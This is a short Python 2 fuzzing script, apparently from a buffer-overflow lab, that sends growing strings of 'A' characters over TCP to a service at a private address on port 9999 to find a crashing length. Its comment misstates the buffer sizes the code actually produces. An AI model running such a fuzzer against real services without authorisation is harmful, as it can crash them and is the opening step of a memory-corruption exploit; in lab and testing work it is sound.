#!/usr/bin/python
import socket
import sys
from time import sleep

# Create an array of buffers, from 1 to 5900, with increments of 200.
buffer=["A"]
counter=100
while len(buffer) <= 1000:
	buffer.append("A"*counter)
	counter=counter+100

for string in buffer:
	print "Fuzzing with %s bytes" % len(string)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('10.11.23.92',9999))
	message=string + '\r\n'
	s.send(message)
	s.close()